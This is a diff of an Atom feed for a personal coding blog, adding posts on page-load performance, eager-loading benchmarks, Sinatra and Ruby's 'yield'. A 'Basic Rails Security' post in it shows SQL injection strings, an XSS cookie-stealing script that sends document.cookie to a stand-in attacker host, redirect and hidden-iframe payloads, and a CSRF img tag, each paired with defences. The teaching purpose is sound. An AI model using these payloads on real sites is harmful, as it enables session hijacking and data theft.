@@ -1,20 +1,822 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[My Octopress Blog]]></title>
+  <title><![CDATA[H.E.L.M.]]></title>
   <link href="http://desmondrawls.github.io/feed" rel="self"/>
   <link href="http://desmondrawls.github.io/"/>
-  <updated>2013-06-09T14:49:15-04:00</updated>
+  <updated>2013-11-05T19:08:57-05:00</updated>
   <id>http://desmondrawls.github.io/</id>
   <author>
-    <name><![CDATA[Your Name]]></name>
+    <name><![CDATA[Desmond Rawls]]></name>
     
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
   
   <entry>
-    <title type="html"><![CDATA[say my name gitgit push origin source]]></title>
+    <title type="html"><![CDATA[new relic]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/11/05/new-relic/"/>
+    <updated>2013-11-05T10:56:00-05:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/11/05/new-relic</id>
+    <content type="html"><![CDATA[<p>Recording with over-dubbed anime voices from inside a giant robot fighting balloons at the Macy&rsquo;s Thanksgiving Day Parade aka the hardest working man in Business#show aka the textbook-a-day diet center aka the dystopian future think tank aka the final destination coincidence log aka the church of real-life CRUD aka the Flatiron School last man standing.</p>
+
+<p>According to research published by Google and Bing in 2009, even server delays of less that half a second affect user engagement. Of particular interest was Bing&rsquo;s finding that their revenue per user decreased by almost 3% with a server delay of 1 second.</p>
+
+<p>Not to mention the fact that since 2010 Google uses load time as a factor in page rankings.</p>
+
+<p>According to Ilya Grigorik from Google&rsquo;s GoFast team &ldquo;fast&rdquo; means under 250ms. He calls that the magic number. Meanwhile the median load time for a page on desktop is 2.7s and the mean is 6.9s. While you are waiting for your page to load go watch Ilya&rsquo;s talk on web-performance: <a href="http://www.igvita.com/2013/01/15/faster-websites-crash-course-on-web-performance/.">http://www.igvita.com/2013/01/15/faster-websites-crash-course-on-web-performance/.</a></p>
+
+<p>So what should you do to make your site faster? How much can even do? Unless you sit on the board of Comcast or AT&amp;T much of the life cycle of an HTTP Request is actually out of your control.</p>
+
+<p>An HTTP Request goes through four main phases. The first phase is the DNS lookup. It will take approximately 130ms to get the client&rsquo;s browser pointed at your server. There&rsquo;s not much you can do about that. The second phase of an HTTP Request is the handshake. The client&rsquo;s browser will open a TCP connection with the server so that data can start flowing. This handshake requires a round-trip from the client&rsquo;s browser to your server and back again. So the timing depends on how far apart the client and your server are. The only thing you can really do to make this faster is to use a CDN (content delivery network). With a CDN your content will be stored on servers all around the world. This means the HTTP Request will, on average, have less globetrotting to do. Now that a connection is open with the client&rsquo;s browser your server can finally process the HTTP Request. The server responds with assets from the database and arranges them in the body of an HTTP Response. During the fourth and final phase the client&rsquo;s browser has to download all of this content from the server and paint the page.</p>
+
+<p>The last two phases are where you can really improve performance with good design and the right analytic tools. The server response and the content download represent the back-end and the front-end, respectively. They do not, however, have equal impact on the total page load time. According to Steve Souders:<br/>
+&ldquo;80-90% of the end-user response time is spent on the frontend. Start there.&rdquo;</p>
+
+<p>My favorite tools for analyzing front-end performance are Google Analytics and the PageSpeed Chrome extension. Google Analytics mostly tracks visitor behavior and PageSpeed mostly makes suggestions on how to streamline your assets.</p>
+
+<p>When I used PageSpeed on a js-heavy, graphics-heavy site I built I received these suggestions:<br/>
+* Serve scaled images &ndash; I am using the same images for thumbnails (scaled in css) as I am for their full-size twins. According to PageSpeed by serving seperate thumbnails that are properly sized I could save 2.2MB. I ran PageSpeed on NYtimes.com and found that they had the same problem.
+* Enable Compression &ndash; I am not using gzip for two of my js files. According to PageSpeed I could be saving 285KB.
+* Optimize Images &ndash; Two of my images aren&rsquo;t compressed. I could save 38KB by compressing them.
+* Minify Javascript &ndash; I have one unminified javascript file. Minifying this file would save me a slight 513B.
+* Leverage Browser Caching &ndash; By setting an expiration date on static assets I could tell the client&rsquo;s browser to load those assets from the local disk instead of needlessly refreshing them over the network. More on this later.
+* Defer Parsing of JavaScript &ndash; JavaScript blocks other assets from being loaded because the js might change those assets with something like document.write. Browsers don&rsquo;t want that mess so if they find javascript they wait until after the javascript has been run to load the next file in line. This is why js should go after everything right before the closing body tag.
+* Enable Keep-Alive &ndash; Keep-Alive maintains the same TCP connection for multiple HTTP Requests. The tricky thing with TCP connections is that they have a slow-start feature to probe how much data the network can handle in a single segment. Keep-Alive allows your TCP connection to continue sending the largest possible segments. While most of my header do have it enabled, Faye seems to default to disabling Keep-Alive.</p>
+
+<p>I used Rails for the above project. Rails handles much of the front-end optimization automatically with the asset pipeline and with Rack middleware. The asset pipeline will concatenate all your css and js files so that you need less HTTP Requests to serve all your assets. For the issues that have to do with caching Rack::Cache and Rack::ETag are there to help. By default Rack should set the cache-control to public (so it can be stored locally) and provide a max-age. Rack::ETag should provide a fingerprint so that while the assets are still fresh they are not requested from the server again. That means more &ldquo;304 Not Modified 2ms&rdquo; and less &ldquo;200 OK 100ms&rdquo;. It seems like for some of my headers Rack decided to do things differently. If I wanted to over-ride Rack&rsquo;s header defaults I could. For example, to set &ldquo;Cache-Control max-age=180, public&rdquo; I could add &ldquo;expires_in 3.minutes, :public => true&rdquo; to the relevant controller.</p>
+
+<p>Don&rsquo;t rely on tools like PageSpeed to fix your front-end after you build it. Better to, as you go, remember to use the right size/format images, concatenate css and js, put css first and js last, and set your headers to cache static assets. Once you do all that it is time to think about the back-end.</p>
+
+<p>For analyzing server performance New_Relic can tell you everything you want to know. It&rsquo;s better than looking through log files.</p>
+
+<p>While working on a project that used Github&rsquo;s API I had a page to display all the repos for a particular user. When the page took 7s to load I started looking through the server logs. It was immediately obvious which database query was responsible. Knowing that, I was able to track down the bug in my code. The bug turned out to be a check across all the user&rsquo;s repos that was happening every time the user page loaded instead of just once when pulling in the Github API. By taking out this check I was able to load the repos in 12ms instead of 7s.</p>
+
+<p>But what about when the problem is less obvious? My previous example is an easy case. If you are trying to tune your site&rsquo;s performance you probably don&rsquo;t want to be sifting through server logs. New_Relic will show you a break-down of every web transaction and which controller actions are involved.</p>
+
+<p>Using New_Relic I was able to identify a slow controller action.</p>
+
+<p><img src="http://desmondrawls.github.io/images/new_relic_actions.jpg" alt="tables" height="300" width="1000" display="inline"></p>
+
+<p>I realized I had foreign keys that should be indexed but weren&rsquo;t. After indexing I saw my server response time go from 125 ms to under 50ms. Just like that.</p>
+
+<p><img src="http://desmondrawls.github.io/images/new_relic_graph.jpg" alt="tables" height="300" width="1000" display="inline"></p>
+
+<p>Now that I have my front-end and my back-end taken care of, if anything is slow I can blame it on <a href="http://www.youtube.com/watch?v=KpUNA2nutbk">the speed of light</a>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Eager Loading Performance Tests]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/09/14/eager-loading-performance-tests/"/>
+    <updated>2013-09-14T22:09:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/09/14/eager-loading-performance-tests</id>
+    <content type="html"><![CDATA[<p>Recording with multiplexing inspected by firebug from trans-atlantic fiber-optic cables aka the 4ms arbitrage industry aka America the startup aka the fast-fingers words-per-minute hall-of-fame aka the prepared-exclusively-for-Avi-Flombaum library aka the mayor&rsquo;s school-for-kids-that-can&rsquo;t-code-good-and-want-to-learn-to-do-other-things-good-too aka the Flatiron School in exile</p>
+
+<p>Eager loading is boss. But exactly how boss is it? I wanted to measure how helpful the :includes method is so I spent my Saturday night rigging up some performance tests.</p>
+
+<p>I determined that the advantage you get from eager loading depends on how many records you are fetching as much as it depends on how many associated tables you are drawing those records from.</p>
+
+<p>In order to test references to associated tables I am using methods that call each of the associations individually. For example, for one reference I have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#/app/models/project.rb
+</span><span class='line'>  def self.creators
+</span><span class='line'>    projects = self.all
+</span><span class='line'>    projects.each do |project|
+</span><span class='line'>      project.creator.name if project.creator
+</span><span class='line'>    end
+</span><span class='line'>  end
+</span><span class='line'>  
+</span><span class='line'>  def self.creators_with_includes
+</span><span class='line'>    projects = self.includes(:creator).all
+</span><span class='line'>    projects.each do |project|
+</span><span class='line'>      project.creator.name if project.creator
+</span><span class='line'>    end
+</span><span class='line'>  end</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And for seven references I have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>def self.creators_users_ideas_teams_directors_competitors_and_industries
+</span><span class='line'>    projects = self.all
+</span><span class='line'>    projects.each do |project|
+</span><span class='line'>      project.creator.name if project.creator
+</span><span class='line'>      project.user.name if project.user
+</span><span class='line'>      project.idea.name if project.idea
+</span><span class='line'>      project.team.name if project.team
+</span><span class='line'>      project.director.name if project.director
+</span><span class='line'>      project.competitor.name if project.competitor
+</span><span class='line'>      project.industry.name if project.industry
+</span><span class='line'>    end
+</span><span class='line'>  end
+</span><span class='line'>
+</span><span class='line'>  def self.creators_users_ideas_teams_directors_competitors_and_industries_with_includes
+</span><span class='line'>    projects = self.includes(:creator, :idea, :team, :director, :competitor, :industry).all
+</span><span class='line'>    projects.each do |project|
+</span><span class='line'>      project.creator.name if project.creator
+</span><span class='line'>      project.user.name if project.user
+</span><span class='line'>      project.idea.name if project.idea
+</span><span class='line'>      project.team.name if project.team
+</span><span class='line'>      project.director.name if project.director
+</span><span class='line'>      project.competitor.name if project.competitor
+</span><span class='line'>      project.industry.name if project.industry
+</span><span class='line'>    end
+</span><span class='line'>  end</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here is the graph of my experiment varying the number of records being retrieved from the database (the red line is with eager loading):</p>
+
+<p><img src="http://desmondrawls.github.io/images/eager-records.jpg" alt="tables" height="300" width="1000" display="inline"></p>
+
+<p>You save more time when you are retrieving more records. You save approximately half a millisecond per record.</p>
+
+<p>Here is the graph of my experiment with varying the number of tables being referenced (again, the red line is with eager loading):</p>
+
+<p><img src="http://desmondrawls.github.io/images/eager-associations.jpg" alt="tables" height="300" width="1000" display="inline"></p>
+
+<p>This graph looks very similar to the previous one where I vary the number of records. The similarity makes sense. The way I have my methods set up I am retrieving 100 records from each additional table. So it&rsquo;s not surprising that the performance advantage that comes with eager loading one more table is approximately the same as the performance advantage that comes with eager loading 100 more records.</p>
+
+<p>Without eager loading every record comes from a separate database query that doesn&rsquo;t care whether it is returning to the same table over and over or hitting a different table every time. With eager loading you have one initial database query then, after that, every relational call is referencing our stored array of hashes.</p>
+
+<p>So the answer is eager loading saves you approximately half a millisecond per record.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Basic Rails Security]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/09/12/basic-rails-security/"/>
+    <updated>2013-09-12T02:20:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/09/12/basic-rails-security</id>
+    <content type="html"><![CDATA[<p>Recording on version control from the octocat animal shelter aka the hackathon of life aka the conference room that looks a lot like a bar aka the xss justice league aka the no-sql-no-cry school aka the pull-request-of-destiny school aka the ask-me-about-blocks-procs-and-lambdas school aka the Flatiron School in purgatory</p>
+
+<p>Now that I have some idea how to control my tables and views my next big task is to make sure no one else gets any ideas about how to control my tables and views. Security is for lovers. I love my databases and I love my users and I don&rsquo;t want any sql injection or cross-site scripting getting between us.</p>
+
+<h3>The SQL Hamburgler</h3>
+
+<p>Sql injection is the hostile practice of using sql fragments in form inputs to manipulate the database queries that will happen when processing that form. In Pleasantville form inputs supply only values to sql statements. In Crooklyn inputs are fragments of sql statements that will be processed as part of the database query. The corrupt database queries will perform actions that suit your attacker&rsquo;s interests more than yours. Sql injection attacks usually have one of two objectives:</p>
+
+<ol>
+<li>Bypassing Authorization</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:   
+</span><span class='line'>    
+</span><span class='line'>      An attacker entering   ' OR '1'='1   in the name field and   ' OR '1'='1  
+</span><span class='line'>      in the password field results in the sql statement:
+</span><span class='line'>    
+</span><span class='line'>      SELECT * FROM users WHERE login = ''  
+</span><span class='line'>      OR '1'='1'  
+</span><span class='line'>      AND password = ''  
+</span><span class='line'>      OR '2'>'1' LIMIT 1
+</span><span class='line'>
+</span><span class='line'>      This statement will always set the session's current_user to the first user  
+</span><span class='line'>      in the table. The attacker is now logged in as that user whether or not the  
+</span><span class='line'>      attacker is even a casual acquaintance of theirs.</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li>Unauthorized Reading</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>      Given the query  
+</span><span class='line'>      Project.where("name = '#{params[:name]}'")  
+</span><span class='line'>      an attacker entering  
+</span><span class='line'>      ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --  
+</span><span class='line'>      in the name field results in the sql statement:
+</span><span class='line'>    
+</span><span class='line'>      SELECT * FROM projects WHERE (name = '') UNION
+</span><span class='line'>      SELECT id,login AS name,password AS description,1,1,1 FROM users --' 
+</span><span class='line'>    
+</span><span class='line'>      If the number of columns in both queries matches then then this statement  
+</span><span class='line'>      will return a list of all user names and passwords.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Defense Against the Dark Arts</p>
+
+<p>The counter-spell to SQL injection is to handle the database query plan and the values separately. As of Rails 3.1 ActiveRecord enables prepared statements in database queries. A prepared statement looks like:</p>
+
+<pre><code>SELECT "people".* FROM "people" WHERE "people"."id" = ? LIMIT 1  [["id", 1]]
+</code></pre>
+
+<p>For higher-level commands like :new and :find ActiveRecord takes care of the formatting. For lower-level commands like :where and :select you have to do it yourself. Both of these result in prepared statements:</p>
+
+<pre><code>Person.where("user_name = ? AND password = ?", user_name, password).first
+
+Person.new(name: "Spider Jerusalem")
+</code></pre>
+
+<p>Before prepared statements ActiveRecord took four steps to execute a database query:</p>
+
+<ol>
+<li>Parse SQL statement</li>
+<li>Come up with query plan</li>
+<li>Execute query plan</li>
+<li>Return results</li>
+</ol>
+
+
+<p>Without prepared statements the query plan depends on parsing the SQL statement, user input and all. This way SQL fragments in values can affect the query plan.</p>
+
+<p>With prepared statements the database comes up with a query plan and caches it before we send any values. We then send the values along with a token for the cached sequel statement. With the statement already cached(meaning after the first query) the database only needs to perform 2 steps:</p>
+
+<ol>
+<li>Execute the query plan</li>
+<li>Return results</li>
+</ol>
+
+
+<p>This way the values have no affect on the query plan. If an attacker inputs some SQL craziness ActiveRecord will only wind up searching the corresponding column for a row containing that SQL craziness. No harm done.</p>
+
+<p>Efficiency side-note: on SQlite3 and Postgres caching prepared statements means dramatically more efficient database queries. The effect is greater with more complex queries because the query planning step takes longer. On mySQL, however, prepared statements are actually less efficient for simple queries because there is no separate step for query planning in these simple cases. mySQL does still follow the general trend for more complex queries.</p>
+
+<h3>Mass-assignment</h3>
+
+<p>Mass-assignment is a convenient way of processing all the params of a form at once. The vulnerability is that params you don&rsquo;t want to assign can be sent to your controller. For example, with the http request:</p>
+
+<pre><code>PUT http://massassignment.com/users/1?user[can_edit_anything]=true
+</code></pre>
+
+<p>We don&rsquo;t want to assign can_edit_anything without deliberation. By listing attributes under attr-accessible in the model we tell ActiveRecord which attributes it can mass-assign. These should be the benign attributes. Attributes like can_edit_anything have no place on that list.</p>
+
+<pre><code>class User &lt; ActiveRecord::Base
+  attr_accessible :firstname, :lastname
+end
+</code></pre>
+
+<p>We can also customize the list for different roles:</p>
+
+<pre><code>class User &lt; ActiveRecord::Base
+  attr_accessible :firstname, :lastname
+  attr_accessible :can_edit_anything, :as =&gt; :admin
+end
+</code></pre>
+
+<p>The attributes that are listed as accessible will still be protected from meddling as long as your controller is doing it&rsquo;s job. The controller should be checking that you are logged in as the current user before changing the current user&rsquo;s attributes. So you can change your name as many times as you want but no one else can.</p>
+
+<h3>Cross-Site Scripting Attacks</h3>
+
+<p>Cross-site Scripting While SQL injection is a server-side attack, Cross-site Scripting is a client-side attack. In this case, attackers are taking advantage of their input being rendered with the DOM to change the functionality of the page. Cross-site Scripting attacks usually have one of these objectives:</p>
+
+<ol>
+<li>Stealing the cookie to hijack the session</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker enters 
+</span><span class='line'>    
+</span><span class='line'>      &lt;script>document.write('&lt;img src="http://www.cookiemonster.com/' + document.cookie + '">');&lt;/script> 
+</span><span class='line'>    
+</span><span class='line'>    in a field that is unceremoniously dumped into the DOM. The  
+</span><span class='line'>    resulting http request to attacker.com will the cookie information  
+</span><span class='line'>    included in the request.
+</span><span class='line'>    
+</span><span class='line'>    The attacker can then check the logs for www.cookiemonster.com and see
+</span><span class='line'>    
+</span><span class='line'>      GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li>Redirecting to a fake website</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker enters
+</span><span class='line'>    
+</span><span class='line'>      ">&lt;script>document.location='http://yoursoulismine.com';&lt;/script>
+</span><span class='line'>    
+</span><span class='line'>    in a field that is unceremoniously dumped into the DOM. 
+</span><span class='line'>    
+</span><span class='line'>    The page will then redirect to the attacker's url. An attacker might use this  
+</span><span class='line'>     traffic to get more twitter followers, or they might use a phishing site  
+</span><span class='line'>     that imitates the previous page to coax the user into giving  
+</span><span class='line'>     them sensitive information. 
+</span><span class='line'>    
+</span><span class='line'>    Historical side-note: The term "phishing" comes from &lt;>&lt;,  
+</span><span class='line'>    a common html tag in chat transcripts that attackers exploited  
+</span><span class='line'>    in the earliest of such scams.</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li>Defacement</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker enters
+</span><span class='line'>    
+</span><span class='line'>      &lt;iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”>&lt;/iframe>
+</span><span class='line'>    
+</span><span class='line'>    in a field that is unceremoniously dumped into the DOM.
+</span><span class='line'>    
+</span><span class='line'>    Similar to the redirect example, an attacker could open an  
+</span><span class='line'>    iframe that impersonates a part of the original site.  
+</span><span class='line'>    Here the goal might be to display advertisements or, as before,  
+</span><span class='line'>    to coax the user into supplying sensitive information.</span></code></pre></td></tr></table></div></figure>
+
+
+<ol>
+<li><p>Installing malicious software through security holes in the web browser.</p>
+
+<p> See &ldquo;Samy&rdquo;: <a href="http://en.wikipedia.org/wiki/Samy_">http://en.wikipedia.org/wiki/Samy_</a>(computer_worm)</p></li>
+</ol>
+
+
+<p>Defense against the dark arts:</p>
+
+<p>To defend against cookie-stealers we can include httpOnly in the HTTP response header. httpOnly is a flag that can be set on a cookie. This flag makes it so the cookie can only be sent in http requests and it cannot be accessed by client-side script. This defense is effective against ordinary javascript injection but is still vunerable to asynchronous scripts.</p>
+
+<p>Popularity side-note: In 2011 this <a href="http://w2spconf.com/2010/papers/p25.pdf">Report</a> found that just over half the top 50 sites do not use httpOnly and as a result are vulnerable to cookie-stealing xss attacks. As of version 2.3.2 Rails was the only open source framework to set the HTTP-only flag by default. Minswan.</p>
+
+<p>The best defense against xss is old-fashioned santizing of user input. Whitelisting is better than blacklisting. With a blacklist, if you are only filtering the input once then an attacker might anticipate your filter by burying their malicious code in the second layer of their input. For example, <scrscriptipt>, after filtering out &lsquo;script&rsquo;, will still read &lsquo;script&rsquo;. So only accept the good input don&rsquo;t try to filter the bad.</p>
+
+<h3>Cross-Site Request Forgeries</h3>
+
+<p>Cross-site Request Forgeries are like Cross-site Scripting attacks in that they are client-side attacks. In this case, however, the attacker exploits the possibility of the user being logged in on another site. If they are logged in the attack sends a malicious http request to that site.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Example:
+</span><span class='line'>    
+</span><span class='line'>    An attacker posts
+</span><span class='line'>    
+</span><span class='line'>      &lt;img src="http://bank.com/account/1/destroy" />
+</span><span class='line'>
+</span><span class='line'>so that when a user loads the page with that img tag the  
+</span><span class='line'>http request is sent to look for an img. If the user is still  
+</span><span class='line'>logged in to bank.com then the  request will go through and quietly  
+</span><span class='line'>do the attacker's bidding.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Defense against the dark arts:</p>
+
+<p>Being careful about seperating GET and POST helps with the most basic attacks. Rails just about forces good behavior on this front so no GET request should be executing business logic. There is, however, still the case of when an attacker tricks a user into submitting a form with dangerous hidden values.</p>
+
+<p>The <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Synchronizer Token Pattern</a>_Prevention_Cheat_Sheet) calls for embedding a random, unique token in all forms for a given session. The controller action can then check the token to verify that the HTTP request came from an authorized form.</p>
+
+<h3>Conclusion</h3>
+
+<p>Prepared statements, attr-accessible, httpOnly, and restful controller actions are very simple ways of protecting yourself. The Synchronizer Token Pattern takes a little more work but sounds straight-forward. Not having experience with security, I imagine most of the time spent locking down a site goes into sanitizing user input with whitelists and regExp. If you want to survive you can&rsquo;t trust anyone with a keyboard or a touch-screen or a magic mouse or a wiimote.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Student Driver]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/06/23/sinatra-directory-example/"/>
+    <updated>2013-06-23T09:57:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/06/23/sinatra-directory-example</id>
+    <content type="html"><![CDATA[<p>Recording on vhs from your childhood blockbuster video store aka the aliased keystrokes thrift shop aka the Pro-Question Action League &ldquo;a question&rsquo;s a question, no matter how small&rdquo; aka the Land Before Rails aka the RegEx tattoo shop aka straight out the dungeons of code aka The crouching-tiger-hidden-semi-colon School aka The ruby-talk-pretty-one-day School aka The Flatiron School</p>
+
+<br><br><br>
+
+
+<div style="float: right; padding-left: 40px"><img src="http://desmondrawls.github.io/images/mr2.jpg" alt="mr2" width="300" display="inline"></div>
+
+
+<p>I learned to drive on a stick shift. My first car was a red two-seat &lsquo;91 Toyota mr2 kinda like this here. My dad copped it for a quick 3k. He later sold it after I failed to communicate that it was the only vehicle I could ever love.</p>
+
+<br>I would never have been that smitten driving an automatic. Sometimes abstraction is the opposite of intimacy.
+
+
+<br><br><br>
+
+
+<p>That&rsquo;s how I feel about Sinatra. Today I made my first deployable ruby app. It&rsquo;s no hot rod but it will get you from A to B. (<a href="http://www.mycodinghoneymoon.dreamhosters.com/playlister_erb/index.html" title="Jukebox">Jukebox</a>)</p>
+
+<p>Once I was done I understood how all the parts moved. I can conceptualize it and I can even draw an exploded diagram:</p>
+
+<br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/playlister_erb_diagram.jpg" alt="playlister" height="300" width="1000" display="inline"></p>
+
+<p>RIP. Tomorrow we start on Sinatra. I browsed some Sinatra apps on github to try to see how they work. The simplest example I could find is this blogging app called &ldquo;(<a href="https://github.com/adamwiggins/scanty" title="Scanty">Scanty</a>), a really small blog.&rdquo; I tried drawing a diagram of this one too:</p>
+
+<br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/sinatra_example_diagram.jpg" alt="sinatra" height="300" width="1000" display="inline"></p>
+
+<p>This diagram is hard to follow. And the views shouldn&rsquo;t be floating like that.</p>
+
+<p>It&rsquo;d kinda like I just built a lawn mower engine:</p>
+
+<p><img src="http://desmondrawls.github.io/images/mower.jpg" alt="sinatra" height="300" width="1000" display="inline"></p>
+
+<p>Then tried to understand a simple volvo engine:</p>
+
+<br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/volvo.jpg" alt="sinatra" height="300" width="1000" display="inline"></p>
+
+<p>&hellip;and realized I couldn&rsquo;t even find the starter.</p>
+
+<p>At first I thought config.ru was the application file because it required &lsquo;main.&rsquo;</p>
+
+<p>Not being able to find the starter is understable when the engine is packaged like this:</p>
+
+<br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/volvocovered.jpg" alt="volvo" height="300" width="1000" display="inline"></p>
+
+<br><br>
+
+
+<p>All I know right now is that Sinatra is doing some cloak-and-dagger behind-the-scenes shit. And I find that untrustworthy.</p>
+
+<br><br>
+
+
+<p>Is there a steampunk movement in the Ruby community? If you&rsquo;re out there call me..</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[5 Metaphors for 'yield' (My First Semi-Technical Post)]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/06/15/metaphors-for-yield-my-first-semi-technical-post/"/>
+    <updated>2013-06-15T19:59:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/06/15/metaphors-for-yield-my-first-semi-technical-post</id>
+    <content type="html"><![CDATA[<p><strong>Recording with a light-second delay from basecamp at Mt. Ruby where all the rocks are gems and all the gems are mountains aka the origami enchanted forrest aka the blank screen wrecking yard aka the dark room with a light in the corner aka the Grace Hopper appreciation society aka the Sandi Metz support group aka the solar-powered confidence summer jam aka The its-not-about-computers School aka the Flatiron School</strong></p>
+
+<h2>&lsquo;yield&rsquo; is a keyword that appears in a method to turn over the reigns to a yet-to-be-determined block of code. You add the block when you call the function. It can be any block you like.</h2>
+
+<br><br><br>  
+
+
+<p>Trivial examples look like this:</p>
+
+<br><br>  
+
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode1.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode2.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode3.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<br><br><br>
+
+
+<p>-OR-
+With a method that takes an argument:</p>
+
+<br><br><br>
